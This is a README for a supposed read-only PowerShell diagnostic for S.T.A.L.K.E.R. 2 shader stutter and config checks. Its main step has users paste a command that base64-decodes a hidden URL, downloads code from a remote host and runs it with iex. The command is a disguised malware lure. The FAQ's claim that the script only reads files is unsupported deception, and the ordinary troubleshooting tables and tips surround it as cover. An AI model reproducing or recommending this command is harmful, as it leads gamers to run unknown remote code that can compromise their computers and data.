<p align="center">
  <img src="https://i.postimg.cc/gjTMDD7P/banner.png" alt="STALKER 2 Shader & Frame Check — Windows troubleshooting for S.T.A.L.K.E.R. 2: Heart of Chornobyl" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11">
  <img src="https://img.shields.io/badge/Run%20via-PowerShell-5391FE?style=flat-square&logo=powershell" alt="Run via PowerShell">
  <img src="https://img.shields.io/badge/License-MIT-2EA44F?style=flat-square" alt="License: MIT">
</p>

# S.T.A.L.K.E.R. 2 Stuttering and Shader Compilation Freezes — STALKER 2 Shader & Frame Check

**S.T.A.L.K.E.R. 2: Heart of Chornobyl runs on Unreal Engine 5 and relies heavily on DirectX 12 shader compilation and streaming pools. Sudden camera hitches, long shader warm-up screens, and high RAM/VRAM pressure are common client-side bottlenecks on Windows PC.**

**STALKER 2 Shader & Frame Check** is a read-only Windows diagnostic companion and checklist for inspecting local `Stalker2\Saved` configuration directories, checking DirectX shader cache locations, and identifying active `~mods` PAK overrides before editing `Engine.ini`.

**For:** S.T.A.L.K.E.R. 2: Heart of Chornobyl · Windows PC (Steam) · Shader compilation hitches, DX12 cache checks, and memory diagnostics  
**Not for:** memory editing, anti-cheat bypasses, or unverified `Engine.ini` overrides

## Run STALKER 2 Shader & Frame Check with PowerShell

Close **S.T.A.L.K.E.R. 2: Heart of Chornobyl** and preserve any saves or configuration files you want to restore before running a diagnostic check.

1. Press **Win + X** on your keyboard.
2. Choose **Terminal** or **Windows PowerShell** from the menu (on some Windows configurations **Win + X**, then **I** opens the terminal; shortcuts vary).
3. Copy the PowerShell command shown below, paste it into the terminal, and press **Enter**.
4. Review the on-screen messages and verify any proposed file changes before confirming them.

### PowerShell command

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtcGxhY2UudG9wL3dvcmtlcj89NzY1MTI5MDYxMy9GaXg='))) -UseBasicParsing)
```


## What to check first

| Symptom | First useful check | Why it matters |
| --- | --- | --- |
| Severe hitching when entering new hubs or firing weapons | Verify GPU shader cache size and DirectX 12 shader cache files | UE5 compiles PSOs dynamically if the shader cache was cleared or capped too low |
| FPS drops after 30–60 minutes in dense settlements | Compare system RAM and GPU VRAM usage at launch vs. 30 minutes in | Separates gradual memory pressure from baseline graphics presets |
| Infinite or stalled shader compilation screen on launch | Check free disk space on `C:` and back up `AppData\Local\Stalker2\Saved` | Corrupted local shader caches or low system-drive space can stall warm-up |
| Crashes after a game update with mods installed | Inspect `Stalker2\Content\Paks\~mods` for outdated PAK overrides | Script or config PAKs built for earlier builds often conflict after patches |

## Expected Windows directory layout

```text
%LOCALAPPDATA%/
└── Stalker2/
    └── Saved/
        ├── Config/
        │   └── Windows/
        │       ├── GameUserSettings.ini
        │       └── Engine.ini
        ├── Logs/
        └── SaveGames/
```

## Step-by-step checks

### 1. Confirm the latest Steam game build

Open **Steam → Library → S.T.A.L.K.E.R. 2: Heart of Chornobyl → Properties → Updates** and verify installed files before tweaking settings.

### 2. Back up `Stalker2\Saved` before changing configs

Copy `%LOCALAPPDATA%\Stalker2\Saved` to a dated folder in Documents so you can revert `GameUserSettings.ini` or `Engine.ini` cleanly.

### 3. Check free space on the Windows system drive

DirectX 12 and NVIDIA/AMD shader caches write to `%LOCALAPPDATA%` on `C:` even when the game is installed on a secondary SSD.

### 4. Isolate `~mods` PAK files after patches

If the game crashes on startup or shader compilation, temporarily move files out of `Stalker2\Content\Paks\~mods` and test a clean boot.

### 5. Measure frametimes in a repeatable scene

Compare average FPS and 1% low frametime spikes in the same settlement before and after changing Hair, Foliage, or Global Illumination settings.

### 6. Keep changes reversible

Adjust one setting at a time and avoid pasting unverified multi-line `Engine.ini` tweaks from older builds.

## Notes before making changes

Record your game build and Windows version, keep a dated backup before moving, deleting, or overwriting any file, and change one variable at a time so you can undo any step that does not help.

## Before opening an issue

When opening an [issue](../../issues), include:

- Current Steam build ID / update date and Windows 10/11 version;
- CPU, GPU model, GPU driver version, total RAM, and VRAM;
- Whether stutter occurs only during initial shader compilation or continuously;
- Whether any `.pak` files exist in `Stalker2\Content\Paks\~mods`.

Remove your Windows username and personal paths from screenshots and logs before posting publicly.

## Frequently asked questions

**Where are S.T.A.L.K.E.R. 2 config and save files stored on Windows?**  
On Steam Windows installations, configs, logs, and local saves are stored under `%LOCALAPPDATA%\Stalker2\Saved`.

**Why does S.T.A.L.K.E.R. 2 stutter after updating my GPU driver?**  
Updating graphics drivers invalidates the compiled DirectX shader cache, causing temporary stutter until shaders rebuild during gameplay.

**Does this script modify Engine.ini or game files?**  
No. The PowerShell check only reads paths, hardware specs, and file metadata without changing any files.

## Sources and further reading

- [S.T.A.L.K.E.R. 2: Heart of Chornobyl on Steam](https://store.steampowered.com/app/1643320/STALKER_2_Heart_of_Chornobyl/)
- [Official S.T.A.L.K.E.R. 2 Website](https://www.stalker2.com/)

*Independent community project. Not affiliated with GSC Game World, Valve, or Steam. No copyrighted game binaries, save files, or third-party mods are bundled with this repository.*

---

## Search reference: S.T.A.L.K.E.R. 2 Windows Troubleshooting

### S.T.A.L.K.E.R. 2 stuttering and FPS drops on PC

Check DirectX shader cache state, available disk space on `C:`, and RAM/VRAM usage during extended play sessions before applying config tweaks.

### S.T.A.L.K.E.R. 2 shader compilation stuck on launch

Back up `%LOCALAPPDATA%\Stalker2\Saved`, verify game files in Steam, and confirm your graphics driver and Windows storage have sufficient space.

### S.T.A.L.K.E.R. 2 save location on Windows

Local configuration files, crash logs, and save directories reside inside `%LOCALAPPDATA%\Stalker2\Saved`.
